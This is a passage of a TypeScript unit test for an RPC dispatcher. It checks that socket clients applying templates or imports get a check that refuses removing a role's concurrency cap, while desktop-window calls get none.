    const templatesApply = vi.fn((_input: unknown, _check?: (a: Project, b: Project) => void) => ({ project: withLimits(), previousRoles: [] }))
    const importerApply = vi.fn((_input: unknown, _access: unknown, _check?: (a: Project, b: Project) => void) => ({ project: withLimits(), previousRoles: [] }))
    const services: HostServices = {
      projects: { get: () => null, list: () => [] } as never,
      runs: { list: () => [] } as never,
      setup: {} as never,
      maintenance: {} as never,
      settings: settings as never,
      connections: { effectiveSettings: () => settings.get(), effectiveDefault: () => 'anthropic' } as never,
      mcp: {} as never,
      adapterIds: ['mock'],
      harnessProject: () => makeProject({ id: 'harness', roles: [] }),
      importer: { apply: importerApply } as never,
      skills: {} as never,
      skillEvaluation: {} as never,
      capabilities: {} as never,
      quick: {} as never,
      templates: { list: () => [], apply: templatesApply } as never
    }
    return { d: new HostDispatcher(services), templatesApply, importerApply }
  }
  const role0 = makeProject().roles[0]
  const capped = withLimits({ roles: [{ ...role0, maxConcurrent: 2 }] })
  const shed = withLimits({ roles: [{ ...role0 }] })

  it('a socket client gets the widening check, which refuses a chart that sheds a role cap and passes one that keeps it', async () => {
    const { d, templatesApply, importerApply } = setup()
    await d.invokeRpc(IPC.templatesApply, [{ projectId: 'proj_a', templateId: 'tpl_x', mode: 'replace' }], CONFIGURE)
    await d.invokeRpc(IPC.projectsApplyImport, [{ projectId: 'proj_a', mode: 'replace', digest: 'd' }], CONFIGURE)
    for (const check of [templatesApply.mock.calls[0]![1], importerApply.mock.calls[0]![2]]) {
      expect(check).toBeTypeOf('function')
      expect(() => check!(capped, shed)).toThrow(/OrgAI window only: Role\.maxConcurrent/)
      expect(() => check!(capped, structuredClone(capped))).not.toThrow()
    }
  })

  it('the desktop window gets no check', async () => {
    const { d, templatesApply, importerApply } = setup()
    await d.invoke(IPC.templatesApply, [{ projectId: 'proj_a', templateId: 'tpl_x', mode: 'replace' }], DESKTOP)
    await d.invoke(IPC.projectsApplyImport, [{ projectId: 'proj_a', mode: 'replace', digest: 'd' }], DESKTOP)
    expect(templatesApply.mock.calls[0]![1]).toBeUndefined()
    expect(importerApply.mock.calls[0]![2]).toBeUndefined()
  })
})
